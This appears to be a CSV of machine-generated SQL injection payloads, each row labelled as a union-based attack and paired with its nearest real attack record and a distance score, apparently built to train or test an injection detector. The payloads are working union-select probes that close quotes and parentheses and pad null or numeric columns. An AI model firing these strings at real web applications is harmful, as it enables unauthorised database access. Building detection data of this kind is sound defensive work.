id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
GAN_000112,attack,union,"1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000907,7.688794063635277
GAN_000113,attack,union,"1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000382,3.7350466745398476
GAN_000114,attack,union,"1'   )    )    as bwjl where 8538  =  8538 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000886,5.153422276006622
GAN_000115,attack,union,"-4825%'  )   union all select 6804,6804,6804,6804,6804,6804,6804--",nearest_attack_euclidean,R000814,8.35008233211453
GAN_000116,attack,union,"-8215%""  )   union all select 3877,3877,3877,3877,3877,3877--",nearest_attack_euclidean,R000787,6.126544242959014
GAN_000117,attack,union,"1'   )    )    as bwjl where 8538  =  8538 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000886,5.730059257820998
GAN_000118,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000948,3.812542565663041
GAN_000119,attack,union,"-5317'   )    )    union all select 7673,7673,7673,7673,7673,7673#",nearest_attack_euclidean,R000982,4.909934728920858
GAN_000120,attack,union,"1'+  (  select cjcp where 2590  =  2590 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000511,5.862501961347415
GAN_000121,attack,union,"-8215%""  )   union all select 3877,3877,3877,3877,3877,3877--",nearest_attack_euclidean,R000787,7.80126434899932
GAN_000122,attack,union,"-6155%'   )    )    union all select 2421,2421,2421,2421,2421#",nearest_attack_euclidean,R001141,4.7275502057258905
GAN_000123,attack,union,"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#",nearest_attack_euclidean,R000273,4.244535548174651
GAN_000124,attack,union,"-2287'   )    )    union all select 1200,1200,1200,1200,1200#",nearest_attack_euclidean,R001093,3.9134263348400147
GAN_000125,attack,union,"1'  )   where 9842  =  9842 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000207,4.958990660096453
GAN_000126,attack,union,"1'   )    )    as xebq where 7959  =  7959 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000375,4.577014515457275
GAN_000127,attack,union,"1%'   )    )    union all select null,null,null,null,null--",nearest_attack_euclidean,R001262,4.3462494428764415
GAN_000128,attack,union,"1'   )    )    as xebq where 7959  =  7959 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000375,4.381961702013108
GAN_000129,attack,union,"1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000382,3.6998569611220398
GAN_000130,attack,union,"1'   )    )    union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000626,5.267793574133701
GAN_000131,attack,union,"1'+  (  select cjcp where 2590  =  2590 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000511,6.442090662169797
GAN_000132,attack,union,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000314,4.303303014718352
GAN_000133,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000988,4.895189082780118
GAN_000134,attack,union,"1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001586,4.85124068065816
GAN_000135,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000791,3.6229782205743812
GAN_000136,attack,union,"1'   )    )    as xebq where 7959  =  7959 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000375,4.823311371467378
GAN_000137,attack,union,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000314,3.9410248338030778
GAN_000138,attack,union,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",nearest_attack_euclidean,R001362,7.1458341619975085
GAN_000139,attack,union,"1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000382,5.260753988250088
GAN_000140,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R001354,5.865881231455881
GAN_000141,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000339,4.421237497846014
GAN_000142,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R001522,4.407500738114999
GAN_000143,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R001522,4.863648409146934
GAN_000144,attack,union,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000314,4.247337832693489
GAN_000145,attack,union,"1'+  (  select cjcp where 2590  =  2590 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000511,5.237169846181417
GAN_000146,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000339,4.251669569118045
GAN_000147,attack,union,"1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000382,4.323116106553031
GAN_000148,attack,union,"1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001586,4.320989616132912
GAN_000149,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000339,4.380951617334689
GAN_000150,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R001354,6.980537620733555
GAN_000151,attack,union,"-6155%'   )    )    union all select 2421,2421,2421,2421,2421#",nearest_attack_euclidean,R001141,3.995539321579707
GAN_000152,attack,union,"-7858'  )   union all select 1541,1541,1541,1541,1541,1541#",nearest_attack_euclidean,R000327,4.869954391510645
GAN_000153,attack,union,"1'  )   where 8211  =  8211 union all select null,null,null,null,null#",nearest_attack_euclidean,R000293,4.491405158290101
GAN_000154,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000339,4.414333622946664
GAN_000155,attack,union,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000314,3.712864723488244
GAN_000156,attack,union,"1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000907,6.8155826607280146
GAN_000157,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001292,3.8111708665211514
GAN_000158,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000791,4.578467632924267
GAN_000159,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000791,3.5035080237265968
GAN_000160,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000948,4.586053900449075
GAN_000161,attack,union,"1'  )   where 8211  =  8211 union all select null,null,null,null,null#",nearest_attack_euclidean,R000293,4.177987487255486
GAN_000162,attack,union,"1'  )   where 8211  =  8211 union all select null,null,null,null,null#",nearest_attack_euclidean,R000293,3.8004287561487393
GAN_000163,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R001354,4.564618739577875
GAN_000164,attack,union,"1'   )    )    as xebq where 7959  =  7959 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000375,4.522621418402272
GAN_000165,attack,union,"-8215%""  )   union all select 3877,3877,3877,3877,3877,3877--",nearest_attack_euclidean,R000787,5.497232014360183
GAN_000166,attack,union,"-2316%' union all select 8636,8636,8636,8636,8636,8636,8636--",nearest_attack_euclidean,R001329,8.631576674947977
GAN_000167,attack,union,"-4452%"" union all select 7141,7141,7141,7141,7141,7141,7141,7141--",nearest_attack_euclidean,R001405,11.83047452930395
GAN_000168,attack,union,"-8215%""  )   union all select 3877,3877,3877,3877,3877,3877--",nearest_attack_euclidean,R000787,8.442512667719129
GAN_000169,attack,union,"1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000382,4.440554915832588
GAN_000170,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R001354,5.093792751202249
GAN_000171,attack,union,"1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000907,9.0522789869335
GAN_000172,attack,union,"-2287'   )    )    union all select 1200,1200,1200,1200,1200#",nearest_attack_euclidean,R001093,4.0359984329891505
GAN_000173,attack,union,"1'   )    )    as xebq where 7959  =  7959 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000375,5.6893174815410426
GAN_000174,attack,union,"1'  )   where 8211  =  8211 union all select null,null,null,null,null#",nearest_attack_euclidean,R000293,3.962967711573971
GAN_000175,attack,union,"1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000907,8.413458565906941
GAN_000176,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000339,4.528352269798871
GAN_000177,attack,union,"1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000382,4.36378213269545
GAN_000178,attack,union,"1'+  (  select ugvj where 2593  =  2593 union all select null,null,null,null,null#",nearest_attack_euclidean,R000963,6.194195722843859
GAN_000179,attack,union,"1'   )    )    as orvy where 7270  =  7270 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000636,6.269601817755421
GAN_000180,attack,union,"1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000382,5.160690958980291
GAN_000181,attack,union,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",nearest_attack_euclidean,R001362,5.6740673680781395
GAN_000182,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R001522,5.466637240407178
GAN_000183,attack,union,"1'+  (  select cjcp where 2590  =  2590 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000511,5.332935003464457
GAN_000184,attack,union,"1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000382,3.9213904458888447
GAN_000185,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000948,4.755946224960217
GAN_000186,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001292,4.081458035419606
GAN_000187,attack,union,"-6155%'   )    )    union all select 2421,2421,2421,2421,2421#",nearest_attack_euclidean,R001141,3.967410069682138
GAN_000188,attack,union,"1'   )    )    as xebq where 7959  =  7959 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000375,5.377889131377742
GAN_000189,attack,union,"-1164""  )   union all select 6617,6617,6617,6617,6617,6617--",nearest_attack_euclidean,R000613,5.065126596714101
GAN_000190,attack,union,"1'+  (  select cjcp where 2590  =  2590 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000511,6.25956939200671
GAN_000191,attack,union,"-4825%'  )   union all select 6804,6804,6804,6804,6804,6804,6804--",nearest_attack_euclidean,R000814,6.656957366735941
GAN_000192,attack,union,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",nearest_attack_euclidean,R001362,4.223831286596512
GAN_000193,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R001354,6.687238748096042
GAN_000194,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000692,4.058774914756909
GAN_000195,attack,union,"1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000907,6.57453199588028
